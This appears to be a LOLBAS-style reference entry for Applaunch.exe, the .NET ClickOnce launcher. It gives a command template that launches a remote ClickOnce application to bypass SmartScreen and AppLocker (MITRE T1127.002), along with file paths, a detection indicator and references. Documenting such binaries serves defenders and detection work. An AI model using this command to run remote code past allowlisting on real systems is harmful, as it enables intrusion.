---
Acknowledgement:
- Person: Nathan Saw
Author: Nathan Sawyer
Commands:
- Category: AWL Bypass
  Command: '"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate
    "{REMOTEURL}#APPLICATION_METADATA_HERE"'
  Description: Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen
    and default AppLocker rules when the application is published as partial trust.
  MitreID: T1127.002
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: ClickOnce
  - Execute: Remote
  Usecase: Execute ClickOnce applications in environments where `dfsvc.exe` would
    normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass
    in rare configurations.
Created: 2026-08-08
Description: Microsoft .NET ClickOnce Launch Utility.
Detection:
- IOC: Applaunch.exe rarely executes unless any ClickOnce partial trusted apps are
    used. Any use or invocation outside dfsvc.exe with `/activate` should be considered
    suspicious.
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Applaunch.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Applaunch.exe
- Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Applaunch.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe
Name: Applaunch.exe
Resources:
- Link: https://nathan2.com/posts/clicktools
- Link: https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment
- Link: https://web.archive.org/web/20060913192623/http://blogs.msdn.com/shawnfa/archive/2005/11/30/498610.aspx
mitre_data:
  technique_ids:
  - T1127.002
tags:
- lolbas/osbinaries
---

# Applaunch.exe

Microsoft .NET ClickOnce Launch Utility.

# Path(s)

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Applaunch.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Applaunch.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Applaunch.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe`

# AWL Bypass Commands

Launches a ClickOnce application via `Applaunch.exe`. Bypasses SmartScreen and default AppLocker rules when the application is published as partial trust.

```batch
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"
```

- **Usecase:** Execute ClickOnce applications in environments where `dfsvc.exe` would normally enforce full-trust and SmartScreen checks. Can be abused as an AWL bypass in rare configurations.
- **Privileges Required:** User
- **MitreID:** `T1127.002`
- **Operating System(s):** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://nathan2.com/posts/clicktools
- https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment
- https://web.archive.org/web/20060913192623/http://blogs.msdn.com/shawnfa/archive/2005/11/30/498610.aspx
# Acknowledgements

- Nathan Sawyer (Authored, 2026-08-08)
- Nathan Saw